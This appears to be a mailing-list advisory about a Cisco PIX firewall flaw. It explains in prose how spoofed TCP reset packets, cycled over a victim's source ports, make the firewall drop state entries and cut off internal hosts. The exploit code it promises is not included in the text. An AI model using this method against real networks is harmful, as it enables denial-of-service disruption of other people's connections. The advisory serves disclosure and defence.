  Hi All, just a bit of a security notification.
 
  Cisco has been informed of this problem and Im waiting for a fix for the
  problem, Ive also noted that various other firewalls are effected by this
  code, though if you wanna know if whatever you are running is effected,
  you will have to test it.
 
  A brief rundown of the problem.
 
  If you run routable ips on your internal interface on your pix, and
  routeable ips on your external interface, so the pix is not running nat,
  the pix keeps a state table of everything going on.  Anything that is not
  in your state table that attempts to come in from the outside is denied,
  even if there is a conduit in place to permit anything.  Which means that
  you have to establish a connection from your internal network to your
  external network before anything external can send data back.  This is a
  really nice feature, unfortunatly there is a big of a bug that I found in
  this.  While testing on in house equipment for possible flaws, as we
  continually test various products, I found the following.
 
  On recieving a RST packet (TCP Reset) from a given host with the correct
  source and destination port, the PIX will drop the state entry for that
  particular connection, which means the tcp connection dies due to the fact
  that no state entry the external box can no longer talk to the internal
  box.
 
  So, if we take a standard raw ip packet, give it a tcp header, and set the
  source ip as a machine that your internal box is connected to, and the
  destination ip as your internal machine, set the source port on the
  spoofed ip as the port the person is connected to, set your destination
  port on your destination ip cyclically to possible source ports on his
  side, and send resets, it will drop the persons state table entry, cutting
  him off from the box he is connected to.
 
  Now, the one question I asked when I wrote this, is why does this work,
  why is there no seq/ack checking on RST packets, this was answered in the
  TCP RFC, saying that seq/ack numbers are not checked on RST packets,
  however they are checked on FIN packets, hence using FIN packets for this
  test is futile without sequence prediction code.
 
  There is a simple work around for this problem however, and anyone wishing
  to know the details of that is free to email me at andrew@cnsec.co.za for
  details.
 
  Below I have posted example code to show the exploit and how it works, and
  hopefully this will be useful to someone on this list and help fix a
  fairly nasty denial of service problem.
 
  Many Thanks
